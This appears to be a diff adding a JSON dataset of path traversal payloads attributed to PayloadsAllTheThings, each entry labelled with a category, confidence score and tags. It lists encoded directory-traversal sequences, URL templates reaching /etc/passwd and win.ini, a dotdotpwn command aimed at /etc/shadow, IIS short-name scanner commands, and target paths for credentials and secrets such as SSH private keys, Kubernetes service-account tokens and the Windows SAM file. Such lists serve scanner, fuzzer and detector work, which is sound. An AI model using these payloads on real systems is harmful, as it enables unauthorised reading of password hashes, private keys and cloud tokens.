@@ -1,0 +1,852 @@
+[
+  {
+    "payload": "perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "../",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "..\\",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "..\\/",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "%2e%2e%2f",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "%252e%252e%252f",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "%c0%ae%c0%ae%c0%af",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "%uff0e%uff0e%u2215",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "%uff0e%uff0e%u2216",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "..././",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "...\\.\\",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/.%00./.%00./etc/passwd",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "..;/",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "\\\\localhost\\c$\\windows\\win.ini",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/(S(X))/",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/(Y(Z))/",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/(G(AAA-BBB)D(CCC=DDD)E(0-1))/",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/(S(X))/admin/(S(X))/main.aspx",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/(S(x))/b/(S(x))in/Navigator.dll",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/MyApp/(S(X))/",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/admin/(S(X))/main.aspx",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/admin/Foobar/(S(X))/../(S(X))/main.aspx",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "shortscan http://example.org/",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "url:file:///etc/passwd",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "url:http://127.0.0.1:8080",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/etc/issue",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/etc/group",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/etc/hosts",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/etc/motd",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/self/environ",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/version",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/cmdline",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/sched_debug",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/mounts",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/net/arp",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/net/route",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/net/tcp",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/net/udp",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/self/cwd/index.php",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/proc/self/cwd/main.py",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/var/lib/mlocate/mlocate.db",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/var/lib/plocate/plocate.db",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/var/lib/mlocate.db",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/etc/passwd",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/etc/shadow",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/home/$USER/.bash_history",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/home/$USER/.ssh/id_rsa",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/etc/mysql/my.cnf",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/token",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/namespace",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/certificate",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "/var/run/secrets/kubernetes.io/serviceaccount",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "C:\\Windows\\win.ini",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "C:\\windows\\system32\\license.rtf",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/inetpub/logs/logfiles",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/inetpub/wwwroot/global.asa",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/inetpub/wwwroot/index.asp",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/inetpub/wwwroot/web.config",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep.inf",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep/sysprep.inf",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep/sysprep.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/system32/inetsrv/metabase.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep.inf",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep/sysprep.inf",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/sysprep/sysprep.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/system volume information/wpsettings.dat",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/system32/inetsrv/metabase.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/unattend.txt",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/unattend.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/unattended.txt",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/unattended.xml",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/windows/repair/sam",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  },
+  {
+    "payload": "c:/windows/repair/system",
+    "category": "path_traversal",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "path_traversal payload from documentation",
+    "tags": [
+      "path_traversal"
+    ]
+  }
+]
